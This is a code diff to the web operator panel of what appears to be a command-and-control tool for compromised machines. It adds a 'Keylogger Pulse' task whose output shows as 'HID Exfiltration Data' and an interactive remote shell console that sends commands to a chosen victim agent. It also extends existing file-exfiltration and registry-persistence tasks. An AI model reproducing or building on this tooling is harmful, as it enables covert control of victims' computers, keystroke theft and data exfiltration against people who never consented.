@@ -146,6 +146,7 @@
               <option value="upload">Deploy Artifact (Upload)</option>
               <option value="download">Exfiltrate Telemetry (Download)</option>
               <option value="persist">Persistence Vector (Registry)</option>
+              <option value="keylogger">Keylogger Pulse (HID)</option>
             </select>
             <input
               type="text"
@@ -172,6 +173,14 @@
             />
             <button onclick="sendTask()">Execute Job</button>
           </div>
+        </div>
+
+        <!-- Mode Selection Tabs -->
+        <div id="orchestra-tabs" class="tab-container" style="display: none">
+          <div class="tab active" onclick="switchTab('history')">
+            Job History
+          </div>
+          <div class="tab" onclick="switchTab('terminal')">Live Console</div>
         </div>
 
         <!-- Job History -->
@@ -211,6 +220,30 @@
               </thead>
               <tbody id="task-history"></tbody>
             </table>
+          </div>
+        </div>
+
+        <!-- Live Console -->
+        <div id="console-container" style="display: none">
+          <div class="glass-card" style="padding: 0">
+            <div class="console-wrapper">
+              <div id="console-output" class="console-output">
+                <div style="color: grey">
+                  [*] Terminal initialized. Awaiting commands...
+                </div>
+              </div>
+              <div class="console-input-area">
+                <span class="console-prompt">node@dali:~#</span>
+                <input
+                  type="text"
+                  id="console-input"
+                  class="console-input"
+                  autofocus
+                  placeholder="Type a command and press Enter..."
+                  onkeydown="handleConsoleInput(event)"
+                />
+              </div>
+            </div>
           </div>
         </div>
       </div>
@@ -287,11 +320,33 @@
         } catch (e) {}
       }
 
+      let commandHistory = [];
+      let historyIndex = -1;
+
+      function switchTab(tab) {
+        const history = document.getElementById("terminal-container");
+        const consoleEle = document.getElementById("console-container");
+        const tabs = document.querySelectorAll(".tab");
+
+        tabs.forEach((t) => t.classList.remove("active"));
+        if (tab === "history") {
+          history.style.display = "block";
+          consoleEle.style.display = "none";
+          tabs[0].classList.add("active");
+        } else {
+          history.style.display = "none";
+          consoleEle.style.display = "block";
+          tabs[1].classList.add("active");
+          document.getElementById("console-input").focus();
+        }
+      }
+
       function selectAgent(agent) {
         activeAgentId = agent.id;
         document.getElementById("welcome-screen").style.display = "none";
         document.getElementById("agent-controls").style.display = "block";
-        document.getElementById("terminal-container").style.display = "block";
+        document.getElementById("orchestra-tabs").style.display = "flex";
+        switchTab("history");
 
         const displayName = agent.info?.user || agent.id.substring(0, 8);
         const displayIp = agent.info?.ip || "0.0.0.0";
@@ -312,6 +367,61 @@
 
         fetchAgents();
         fetchHistory();
+      }
+
+      function handleConsoleInput(event) {
+        const input = event.target;
+        if (event.key === "Enter") {
+          const cmd = input.value.trim();
+          if (cmd) {
+            commandHistory.push(cmd);
+            historyIndex = commandHistory.length;
+            appendToConsole(
+              `<span style="color: var(--accent)">> ${cmd}</span>`
+            );
+            sendTaskToNode("shell", cmd);
+            input.value = "";
+          }
+        } else if (event.key === "ArrowUp") {
+          if (historyIndex > 0) {
+            historyIndex--;
+            input.value = commandHistory[historyIndex];
+          }
+        } else if (event.key === "ArrowDown") {
+          if (historyIndex < commandHistory.length - 1) {
+            historyIndex++;
+            input.value = commandHistory[historyIndex];
+          } else {
+            historyIndex = commandHistory.length;
+            input.value = "";
+          }
+        }
+      }
+
+      function appendToConsole(html) {
+        const out = document.getElementById("console-output");
+        const div = document.createElement("div");
+        div.innerHTML = html;
+        out.appendChild(div);
+        out.scrollTop = out.scrollHeight;
+      }
+
+      async function sendTaskToNode(type, cmd) {
+        if (!activeAgentId) return;
+        try {
+          await apiFetch(`/operator/tasks`, {
+            method: "POST",
+            body: JSON.stringify({
+              agent_id: activeAgentId,
+              task_type: type,
+              command: cmd,
+            }),
+          });
+        } catch (e) {
+          appendToConsole(
+            `<span style="color: var(--danger)">[!] Failed to send task</span>`
+          );
+        }
       }
 
       async function deleteCurrentNode() {
@@ -378,6 +488,15 @@
                         }', '${filename}')" style="padding: 4px 10px; font-size: 0.7rem;">Save File</button>
                     </div>
                 `;
+            } else if (
+              task.status === "completed" &&
+              task.type === "keylogger" &&
+              task.result?.log
+            ) {
+              outcome = `
+                    <div style="color: #fbbf24; font-weight: 700; margin-bottom: 5px;">HID Exfiltration Data:</div>
+                    <div class="result-block" style="white-space: pre-wrap; color: #fcd34d;">${task.result.log}</div>
+                `;
             } else if (task.result) {
               const out =
                 task.result.stdout ||
@@ -426,6 +545,7 @@
           download:
             "Remote file path to exfiltrate (e.g. C:\\Users\\Public\\secret.txt)...",
           persist: "Registry key name for persistence (optional)...",
+          keylogger: "Action (start/stop/dump) and optional duration...",
         };
         input.placeholder = mapping[type] || "Enter configuration payload...";
       }
@@ -456,7 +576,13 @@
           task_type: type,
         };
 
-        if (type === "upload" && selectedFileData) {
+        if (type === "keylogger") {
+          const parts = command.split(" ");
+          taskReq.payload = {
+            action: parts[0] || "start",
+            duration: parseInt(parts[1]) || 30,
+          };
+        } else if (type === "upload" && selectedFileData) {
           let destPath = command
             .replace("Ready to upload: " + selectedFileData.filename, "")
             .trim();
@@ -517,12 +643,28 @@
             ) {
               activeAgentId = null;
               location.reload();
-            } else {
+            } else if (data.event === "task_updated") {
               fetchHistory();
+              // For console mode, if the updated task is a shell task, we can show it in console
+              // But we need to fetch the result. We'll let fetchHistory handle UI, but maybe fetch latest console line?
+              checkLatestConsoleResult();
             }
           }
         };
         ws.onclose = () => setTimeout(connectWebSocket, 5000);
+      }
+
+      async function checkLatestConsoleResult() {
+        const res = await apiFetch(`/api/tasks/${activeAgentId}`);
+        const tasks = await res.json();
+        const lastShell = tasks.find(
+          (t) => t.type === "shell" && t.status === "completed"
+        );
+        if (lastShell && lastShell.result && !lastShell._shown_in_console) {
+          const out = lastShell.result.stdout || lastShell.result.error || "";
+          appendToConsole(out.replace(/\n/g, "<br>"));
+          lastShell._shown_in_console = true; // Temporary flag
+        }
       }
 
       connectWebSocket();
